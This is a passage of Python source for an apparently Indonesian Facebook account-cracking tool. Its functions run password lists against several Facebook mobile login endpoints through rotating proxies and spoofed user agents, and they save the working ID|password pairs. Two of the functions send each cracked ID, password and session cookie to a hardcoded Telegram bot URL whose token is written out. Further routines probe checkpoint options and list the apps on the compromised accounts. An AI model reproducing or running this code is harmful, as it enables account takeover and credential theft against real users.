			proxs= {'http': 'socks4://'+nip}

			ses.headers.update({"Host":'d.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			p = ses.get('https://d.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}

			ses.headers.update({"Host":'d.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False,proxies=proxs)

			if "checkpoint" in po.cookies.get_dict().keys():

				print(f'\r{K}[+] PTR-ID CP {idf} {K}[+] CP {pw}')     

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				ok+=1

				coki=po.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				requests.get(f"https://api.telegram.org/bot5920991235:AAFLk7Qd5vIe4ywO3XXqw_bbgHKPiWoFCMw/sendMessage?chat_id=5665425268&text= {year} : {idf} : {pw} : {kuki} ")				

				print(f'\r\x1b[32m[ MR.XATAR-OK] {year} | {idf} | {pw} | {kuki} ')

				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')

				cek_apk()

				break

				

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

#------------------[ METHODE-MBASIC-2 ]-------------------#

def crackfree(idf,pwv):

	global loop,ok,cp

	sys.stdout.write(f"\r \r[ PTR ] {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - {cp}{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P} "),

	sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})

			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}

			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			if "HAMA checkpoint" in po.cookies.get_dict().keys():

				print(f'\r{K}CP {idf}|{pw}{N}')     

				os.popen('PTR CP')

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				ok+=1

				coki=po.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				requests.get(f"https://api.telegram.org/bot5920991235:AAFLk7Qd5vIe4ywO3XXqw_bbgHKPiWoFCMw/sendMessage?chat_id=5665425268&text= WOLF LIVE ➯ ID ➯ {idf} ➣ PASS ➢ {pw} ")				

				print(f'\r{H} PTR OK {idf} | PASS : {pw}|{N}')

				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')

				cek_apk(session,coki)

				break

				

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1



#---------------------[ METHODE-TOUCH-3 ]---------------------#

def cracktouch(idf,pwv):

	global loop,ok,cp

	bi = random.choice([u,k,kk,b,h,hh])

	pers = loop*100/len(id2)

	fff = '%'

	nip=random.choice(prox)

	proxs= {'http': 'socks5://'+nip}

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	sys.stdout.write('\rPTR¬¬ OK:%s ¬ CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()

	for pw in pwv:

		try:

			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})

			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}

			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			if "checkpoint" in po.cookies.get_dict().keys():

				if 'ya' in oprek:

					akun.append(idf+'|'+pw)

					ceker(idf,pw)

				elif 'ya' in princp:

					print('\n')

					statuscp = f'[YAA] ID       : {idf} [HAMA] PASSWORD : {pw}'

					statuscp1 = nel(statuscp, style='red')

					cetak(nel(statuscp1, title='AOREC-XD CP'))

					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')

					akun.append(idf+'|'+pw)

					cp+=1

				else:continue

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}

				if 'no' in taplikasi:

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					print('\n')

					statusok = f'[HAMA ok] ID       : {idf}\n[HAMA ok] PASSWORD : {pw}'

					statusok1 = nel(statusok, style='green')

					cetak(nel(statusok1, title='AOREC-XD OK'))

					ok+=1

					break

				elif 'ya' in taplikasi:

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					user=idf

					infoakun = ""

					session = requests.Session()

					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text

					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text

					infoakun += (f"\n[bold cyan][â€¢] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")

					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))

					nok=1

					for muncul in apkaktif:

						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")

						nok+=1



					hit=0

					infoakun += (f"\n[bold yellow][â€¢] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")

					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))

					hit=0

					for muncul in apkexp:

						hit+=1

						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")

					print('\n')

					statusok = f'[bold green][ PTR OK ] ID       : {idf}\n[ PTR OK ] PASSWORD : {pw}\n[ PTR OK ][/bold green]\n{infoakun}'

					statusok1 = nel(statusok, style='green')

					cetak(nel(statusok1, title='[bold green]PTR-XD OK[/bold green]'))

					ok+=1

					break





			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#

os.system('clear');banner()

def crackmbasic(idf,pwv):

	global loop,ok,cp

	bo = random.choice([m,k,h,b,u,x])

	sys.stdout.write(f"\r[ PTR ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),

	sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			nip=random.choice(prox)

			proxs= {'http': 'socks4://'+nip}

			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})

			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			if "checkpoint" in po.cookies.get_dict().keys():

				print(f'\r{x}MR-CP{k} {idf}|{pw}{N}')     

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}

				if 'no' in taplikasi:

					ok+=1

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					print(f'\r{h} [+] PTR-OK  {idf} [+] PASS {pw}')

					open('OK/'+okc,'a').write(idf+'-'+pw+'-'+kuki+'\n')

					break

				elif 'ya' in taplikasi:

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('/OK/'+okc,'a').write(idf+'-'+pw+'-'+kuki+'\n')

					user=idf

					infoakun = ""

					session = requests.Session()

					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text

					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text

					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))

					nok=1

					for muncul in apkaktif:

						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")

						nok+=1



					hit=0

					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))

					hit=0

					for muncul in apkexp:

						hit+=1

						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")

					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')

					ok+=1

					break



			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(1)

	loop+=1

#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#

def ceker(idf,pw):

	global cp

	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'

	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	ses = requests.Session()

	try:

		hi = ses.get('https://mbasic.facebook.com')

		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')

		jo = ho.find('form')

		data = {}

		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']

		for anj in jo('input'):

			if anj.get('name') in lion:

				data.update({anj.get('name'):anj.get('value')})

		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')

		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))

		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

		cp+=1

		opsi = kent.find_all('option')

		if len(opsi)==0:

			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))

		else:

			for opsii in opsi:

				print('\r%s---> %s%s'%(kk,opsii.text,x))

	except Exception as c:

		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))

		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))

		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

		cp+=1

#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#

def cek_opsi():

	c = len(akun)

	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)

	cetak(nel(hu, title='CEK OPSI'))

	input(x+'['+h+'â€¢'+x+'] Mulai')

	cek = '# PROSES CEK OPSI DIMULAI'

	sol().print(mark(cek, style='green'))

	love = 0

	for kes in akun:

		try:

			try:

				id,pw = kes.split('|')[0],kes.split('|')[1]

			except IndexError:

				time.sleep(2)

				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))

				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))

				continue

			bi = random.choice([u,k,kk,b,h,hh])

			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()

			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'

			ses = requests.Session()

			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

			hi = ses.get('https://mbasic.facebook.com')

			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')

			if "checkpoint" in ses.cookies.get_dict().keys():

				try:

					jo = ho.find('form')

					data = {}

					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']

					for anj in jo('input'):

						if anj.get('name') in lion:

							data.update({anj.get('name'):anj.get('value')})

					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')

					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))

					opsi = kent.find_all('option')

					if len(opsi)==0:

						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))

					else:

						for opsii in opsi:

							print('\r%s---> %s%s'%(kk,opsii.text,x))

				except:

					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))

					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))

			elif "c_user" in ses.cookies.get_dict().keys():

				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))

			else:

				print('\r%s++++ %s|%s ----> CP       %s'%(x,id,pw,x))

			love+=1

		except requests.exceptions.ConnectionError:

			print('')

			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'

			sol().print(mark(li, style='red'))

			exit()

	dah = '# DONE'

	sol().print(mark(dah, style='green'))

	exit()

#----------------------[ CEK-APLIKASI ]---------------------#

def cek_apk():

	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text

	sop = BeautifulSoup(w,"html.parser")

	x = sop.find("form",method="post")

	game = [i.text for i in x.find_all("h3")]

	if len(game)==0:

		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")

	else:

		for i in range(len(game)):

			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text

	sop = BeautifulSoup(w,"html.parser")

	x = sop.find("form",method="post")

	game = [i.text for i in x.find_all("h3")]

	if len(game)==0:

		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")

	else:

		for i in range(len(game)):

			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#



if __name__=='__main__':

	DYNO()
